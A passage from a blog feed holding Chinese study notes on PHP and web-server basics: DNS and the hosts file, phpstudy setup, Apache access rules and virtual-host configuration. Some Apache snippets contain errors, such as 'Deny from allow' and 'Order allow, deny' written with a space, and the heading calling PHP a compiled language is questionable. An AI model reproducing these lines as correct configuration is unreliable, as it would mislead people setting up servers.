&lt;li&gt;使用&lt;code&gt;!n&lt;/code&gt;重复执行第n条历史命令&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;!!&lt;/code&gt;重复执行上一条命令&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;!字串&lt;/code&gt;重复执行最后一条以该字串开头的命令&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;323-命令与文件补全&#34;&gt;3.2.3 命令与文件补全&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在Bash中，命令与文件补全是非常方便与常用的功能，我们只要在输入命令或文件时，按&lt;code&gt;Tab&lt;/code&gt;键就会自动进行补全&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;33-输出重定向&#34;&gt;3.3 输出重定向&lt;/h2&gt;
&lt;h2 id=&#34;34-多命令顺序执行&#34;&gt;3.4 多命令顺序执行&lt;/h2&gt;
&lt;h2 id=&#34;35-shell中特殊符号&#34;&gt;3.5 Shell中特殊符号&lt;/h2&gt;
- https://b40du.github.io/posts/note-imooc-shell-basic/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>笔记-PHP基础</title>
        <link>https://b40du.github.io/posts/note-heima-php-basic/</link>
        <pubDate>Mon, 11 May 2020 23:00:00 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/note-heima-php-basic/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/note-heima-php-basic/ -&lt;h2 id=&#34;学习目标&#34;&gt;学习目标&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;掌握互联网的工作原理&lt;/li&gt;
&lt;li&gt;掌握域名、DNS和IP地址之间的关系&lt;/li&gt;
&lt;li&gt;理解hosts文件在互联网访问过程中的作用&lt;/li&gt;
&lt;li&gt;理解静态网站和动态网站的区别&lt;/li&gt;
&lt;li&gt;理解动态网站的服务器组成&lt;/li&gt;
&lt;li&gt;了解PHP的工作过程&lt;/li&gt;
&lt;li&gt;掌握PHP变量的使用方式&lt;/li&gt;
&lt;li&gt;理解可变变量的概念&lt;/li&gt;
&lt;li&gt;掌握可变变量的访问形式&lt;/li&gt;
&lt;li&gt;理解变量的值传递和引用传递的区别&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;1-php简介&#34;&gt;1 PHP简介&lt;/h1&gt;
&lt;h2 id=&#34;11-概述&#34;&gt;1.1 概述&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;PHP是HyperText Preprocessor的缩写，（超文本预处理器）是一种在服务器端运行的开源的脚本语言&lt;/li&gt;
&lt;li&gt;LAMP组合（Linux，Apache，MySQL，PHP），这四个产品都是公开源代码的产品&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511140657.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;php 是一门语言，用来做业务逻辑
apache 为PHP提供了运行环境
linux 为Apache的运行提供了平台
mysql 数据库用来存储数据
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;wamp&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;windows+apache+ mysql +php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;12-五个基本概念&#34;&gt;1.2 五个基本概念&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;静态网站和动态网站&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;静态页面：服务器不执行的页面
动态页面：服务器执行的页面
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;动态网站中可以存放静态页面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;客户端和服务器端&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;客户端：浏览者
服务器端：给浏览者提供服务
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511152635.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;端口和端口号&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;端口号的范围：0~65535
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511152718.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BS架构和CS架构&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;BS：通过浏览器去访问服务器&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;b:browser（浏览器）
s:server（服务器）
优点：
1. 只要有浏览器就可以访问
2. 开发成本低
缺点：
1. 开发的代码都放在服务器上 胖服务器-瘦客户端
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;所有的web都是BS架构的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CS：通过客户端软件去访问服务器&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;c:client（客户端）
s:server（服务器）
优点：
1. 可以开发客户端和服务器端，这时候就可以实现负载的均衡
缺点：
1. 必须要安装一个软件才能去访问
2. 开发成本高
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;例如：QQ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;前台和后台&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;前台：浏览器看到的界面
后台：管理员看到的界面
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;13-php的优点&#34;&gt;1.3 PHP的优点&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;跨平台：既能在Windows上运行，也能在Linux上运行&lt;/li&gt;
&lt;li&gt;源码开放：不会涉及到版权问题&lt;/li&gt;
&lt;li&gt;语法简单：php 入门简单&lt;/li&gt;
&lt;li&gt;运行在服务器端：只需要在服务器部署环境就可以了&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;2-web-介绍&#34;&gt;2 Web 介绍&lt;/h1&gt;
&lt;h2 id=&#34;21-web-时代的变迁&#34;&gt;2.1 Web 时代的变迁&lt;/h2&gt;
&lt;p&gt;从互联玩刚开始崛起到现在，经历了从 Web1.0 到 Web3.0 的过程。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;Web1.0（信息共享）的主要特点在于用户单纯的获取信息
Web2.0（信息共建）更注重用户的交互作用，用户即是网站内容的浏览者，也是网站内容的制造者
Web3.0（信息传承）通过第三方信息平台对多家网站的信息进行整合，用户在互联网上拥有自己的数据，并能在不同网站上使用
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;举例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;Web1.0：来到一个餐馆，老板给你上了一盘番茄炒蛋
Web2.0：来到一个餐馆，你跟老板主动点了一份番茄炒蛋
Web3.0：来到一个餐馆，老板见到你就问，老规矩，还要番茄炒蛋？
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;22-web服务原理&#34;&gt;2.2 Web服务原理&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;静态网站原理（浏览器-服务器）&lt;/li&gt;
&lt;li&gt;动态网站原理（浏览器-服务器-数据库）&lt;/li&gt;
&lt;li&gt;智能网站原理（浏览器-服务器【分析推荐】-数据库）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;23-搭建-web-服务器&#34;&gt;2.3 搭建 Web 服务器&lt;/h2&gt;
&lt;h3 id=&#34;231-安装-phpstudy&#34;&gt;2.3.1 安装 phpstudy&lt;/h3&gt;
&lt;p&gt;PHPStudy介绍、安装、目录说明、访问测试&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直接解压即可&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511141712.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目录结构&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511141759.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;启动服务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511141945.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;232-访问服务器&#34;&gt;2.3.2 访问服务器&lt;/h3&gt;
&lt;p&gt;在www目录下创建demo.php页面&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;phpinfo&lt;/span&gt;();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;访问服务器&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;访问规则：http://服务器ip地址/php页面
比如：
http://localhost/demo.php
http://127.0.0.1/demo.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511142114.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;233-常用命令&#34;&gt;2.3.3 常用命令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;补充DOS命令&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;切换盘符	盘符:
进入目录	cd 目录地址
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Apache命令&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;httpd -v 查看版本号
httpd -t 检测运行环境
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511142419.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP命令&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;php -v php版本号
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511142545.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;234-互联网通讯原理&#34;&gt;2.3.4 互联网通讯原理&lt;/h3&gt;
&lt;p&gt;本质一台电脑访问另外一台电脑资源、寻址过程（IP地址、端口、域名、DNS）&lt;/p&gt;
&lt;p&gt;在互联网上，IP地址是用来区分每台计算机的标识，但是IP记忆不友好，我们给IP地址取一个名字，一个IP对应一个名字，这个名字就称为域名。&lt;/p&gt;
&lt;p&gt;访问过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511142756.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户端输入域名（网址），在最近的机房做DNS解析（Domian Name Server），DNS解析就是将域名转化为IP地址&lt;/li&gt;
&lt;li&gt;通过IP地址访问服务器&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;235-dns-解析&#34;&gt;2.3.5 DNS 解析&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511142922.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;hosts文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511142959.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;测试&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511143022.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hosts文件用来做DNS解析&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;24-服务器配置&#34;&gt;2.4 服务器配置&lt;/h2&gt;
&lt;h3 id=&#34;241-虚拟目录配置&#34;&gt;2.4.1 虚拟目录配置&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;更改虚拟目录&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;要更改虚拟目录的位置，需要到apache的配置文件中更改（conf/httpd.conf）&lt;/p&gt;
&lt;p&gt;在phpstudy中，http引入了vhost.conf文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511143438.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以，我们到vhost.conf文件中去更改虚拟目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511143238.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;更改虚拟目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511145133.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;提醒：项目上线以后，不可以显示目录结构&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;2411-权限练习&#34;&gt;2.4.1.1 权限练习&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;Order allow, deny
Allow from all
# 允许所有请求访问
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;Order allow, deny
Allow from all
Deny from all
# 拒绝所有请求访问
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;Order allow, deny
Deny from all
Allow from all
# 拒绝所有请求访问
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c:&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PHP&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Apache&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;htdocs&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&amp;gt;
	Order deny, allow
    Allow from 192.168.101.50
    Deny from 192.168
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt;&amp;gt;
# 拒绝192.168开头，但除去（192.168.101.50）的IP的访问
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c:&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PHP&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Apache&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;htdocs&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&amp;gt;
	Order deny, allow
    Allow from 192.168.101.50
    Deny from allow
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt;&amp;gt;
# 只允许192.168.101.50访问
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c:&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PHP&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Apache&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;htdocs&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&amp;gt;
	Order allow, deny
    Allow from 192.168
    Deny from 192.168.101.50
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt;&amp;gt;
# 只允许192.168开头的，但要去除192.168.101.50的IP的访问
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2412-更改默认首页&#34;&gt;2.4.1.2 更改默认首页&lt;/h4&gt;
&lt;p&gt;在httpd.conf配置文件中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511152108.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;默认首页的查找顺序，从前往后。&lt;/p&gt;
&lt;h4 id=&#34;2413-更改监听端口&#34;&gt;2.4.1.3 更改监听端口&lt;/h4&gt;
&lt;p&gt;在httpd.conf配置文件中设置&lt;/p&gt;
&lt;p&gt;通过listen指令设置监听的端口&lt;/p&gt;
&lt;p&gt;可以设置多个监听端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511153115.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问：&lt;/p&gt;
&lt;p&gt;http://域名:端口号/demo.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511153144.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2414-查看端口的占用情况&#34;&gt;2.4.1.4 查看端口的占用情况&lt;/h4&gt;
&lt;p&gt;在命令行下使用netstat -ano查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511153243.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在结果中查找字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511153310.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;242-虚拟主机配置&#34;&gt;2.4.2 虚拟主机配置&lt;/h3&gt;
&lt;p&gt;需求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;输入 www.baidu.com 打开web1的页面
输入 www.sina.com 打开web2的页面
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;要配置虚拟主机，需要在httpd.conf中引入虚拟主机的配置文件（vhost.conf）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511154407.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;vhosts.conf配置如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;VirtualHost&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_default_:80&lt;/span&gt;&amp;gt;
  DocumentRoot &amp;#34;C:\web1&amp;#34;       #指定虚拟目录路径
  ServerName www.baidu.com     # 虚拟目录绑定的域名
  DirectoryIndex aa.php        # 默认首页
  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;C:&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;web1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&amp;gt;
    Options -Indexes -FollowSymLinks +ExecCGI
    AllowOverride All
    Order allow,deny
    Allow from all
    Require all granted
  &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;VirtualHost&lt;/span&gt;&amp;gt;


&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;VirtualHost&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_default_:80&lt;/span&gt;&amp;gt;
DocumentRoot &amp;#34;C:\web2&amp;#34;
 ServerName www.sina.com
 DirectoryIndex bb.php
  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;C:&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;web2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&amp;gt;
    Options -Indexes -FollowSymLinks +ExecCGI
    AllowOverride All
    Order allow,deny
    Allow from all
    Require all granted
  &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;Directory&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;VirtualHost&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在hosts文件中做dns解析&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511154955.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问结果&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511155032.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;243-站点虚拟目录虚拟主机的区别&#34;&gt;2.4.3 站点、虚拟目录、虚拟主机的区别&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;站点：站点就是一个文件夹，用来保存于网站有关的所有素材&lt;/li&gt;
&lt;li&gt;虚拟目录：站点+权限&lt;/li&gt;
&lt;li&gt;虚拟主机：虚拟目录+域名&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-php语法入门&#34;&gt;3 PHP语法入门&lt;/h1&gt;
&lt;h2 id=&#34;31-php是编译型语言&#34;&gt;3.1 PHP是编译型语言&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;编译语言和解释语言的区别在于是否保存最终的可执行程序。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511183132.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP执行过程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511183330.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
